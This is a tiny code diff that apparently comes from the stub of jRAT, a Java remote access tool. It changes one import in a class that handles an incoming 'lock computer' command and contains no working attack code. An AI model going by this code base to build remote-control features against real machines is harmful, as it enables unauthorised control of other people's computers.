@@ -1,6 +1,6 @@
 package se.jrat.stub.packets.incoming;
 
-import se.jrat.common.OperatingSystem;
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet32LockComputer extends AbstractIncomingPacket {
 
